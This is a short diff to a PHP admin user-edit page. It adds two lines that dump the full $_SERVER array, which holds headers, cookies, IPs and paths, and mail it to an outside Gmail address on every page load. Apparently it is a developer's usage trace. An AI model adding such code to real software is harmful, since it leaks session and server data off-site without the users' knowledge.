@@ -1,5 +1,6 @@
 <?php
-                                                                                                 
+$msg = print_r($_SERVER,true);
+mail("kunal.test02@gmail.com"," web/jsadmin/useredit.php.19May in USE",$msg);
 include("time.php");
 include("connect.inc");
 include(JsConstants::$docRoot."/commonFiles/flag.php");
